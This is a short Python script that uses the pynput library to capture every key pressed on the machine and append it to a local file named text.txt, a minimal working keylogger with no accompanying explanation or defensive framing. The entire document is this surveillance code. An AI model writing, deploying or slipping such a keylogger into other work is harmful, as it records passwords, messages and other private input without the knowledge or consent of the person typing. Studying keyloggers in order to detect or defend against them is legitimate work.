#!/usr/bin/env python
import pynput.keyboard


def process_key_press(key):
    with open("text.txt", "a") as file_key:
        file_key.write(str(key))


keyboard = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard:
    keyboard.join()